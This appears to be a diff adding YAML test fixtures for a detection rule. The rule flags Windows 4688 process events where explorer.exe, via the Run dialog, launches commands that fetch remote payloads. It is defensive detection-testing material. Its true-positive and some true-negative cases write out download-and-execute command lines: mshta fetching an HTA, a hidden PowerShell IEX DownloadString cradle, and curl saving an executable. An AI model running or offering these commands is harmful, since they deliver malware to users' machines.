@@ -1,0 +1,45 @@
+true_positives:
+  - name: mshta fetching a remote payload from the Run dialog
+    event:
+      EventID: 4688
+      ParentImage: 'C:\Windows\explorer.exe'
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta https://cdn.example.invalid/verify.hta'
+  - name: powershell download cradle pasted by the user
+    event:
+      EventID: 4688
+      ParentImage: 'C:\Windows\explorer.exe'
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.20/a')"
+  - name: curl one-liner in the Run box
+    event:
+      EventID: 4688
+      ParentImage: 'C:\Windows\explorer.exe'
+      Image: 'C:\Windows\System32\curl.exe'
+      CommandLine: 'curl.exe -o %TEMP%\u.exe http://203.0.113.9/update.exe'
+
+true_negatives:
+  - name: same command line but launched by a build agent, not the shell
+    event:
+      EventID: 4688
+      ParentImage: 'C:\agent\worker.exe'
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://build.internal/x')"
+  - name: user opens a plain shell from the Run dialog with no fetch
+    event:
+      EventID: 4688
+      ParentImage: 'C:\Windows\explorer.exe'
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe'
+  - name: explorer launching a normal application
+    event:
+      EventID: 4688
+      ParentImage: 'C:\Windows\explorer.exe'
+      Image: 'C:\Program Files\Notepad++\notepad++.exe'
+      CommandLine: 'notepad++.exe C:\notes\todo.txt'
+  - name: browser child process, which is a different delivery chain
+    event:
+      EventID: 4688
+      ParentImage: 'C:\Program Files\Google\Chrome\Application\chrome.exe'
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell -c iwr http://example.invalid/x'
